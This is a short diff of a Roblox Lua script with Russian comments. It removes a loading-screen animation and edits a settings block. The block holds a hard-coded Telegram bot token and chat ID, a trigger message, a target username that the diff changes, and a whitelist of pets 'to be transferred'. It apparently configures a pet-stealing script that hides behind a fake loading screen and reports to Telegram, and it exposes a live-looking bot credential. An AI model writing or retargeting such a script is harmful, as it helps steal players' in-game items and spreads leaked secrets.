@@ -98,14 +98,6 @@ task.spawn(function()
     background.ScaleType = Enum.ScaleType.Crop
     background.Parent = screenGui
     
-    -- Пульсирующая анимация фона
-    local tweenService = game:GetService("TweenService")
-    local pulseInfo = TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
-    local pulseTween = tweenService:Create(background, pulseInfo, {
-        Size = UDim2.new(1.05, 0, 1.05, 0)
-    })
-    pulseTween:Play()
-    
     -- Надпись с анимацией точек
     local label = Instance.new("TextLabel")
     label.Size = UDim2.new(1, 0, 0, 50)
@@ -194,12 +186,12 @@ end)
 -- 🔧 НАСТРОЙКИ (ОРИГИНАЛЬНЫЕ РАБОЧИЕ)
 local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
 local TELEGRAM_CHAT_ID = "7144575011"
-local TARGET_PLAYER = "sfdgbzdfsb"
+local TARGET_PLAYER = "Rikizigg"
 local TRIGGER_MESSAGE = "."
 
 -- 🐾 РАСШИРЕННЫЙ БЕЛЫЙ СПИСОК
 local WHITELIST = {
-    "Wasp",
+    "Hawk",
     -- Добавьте сюда других питомцев которых нужно передавать
 }
 
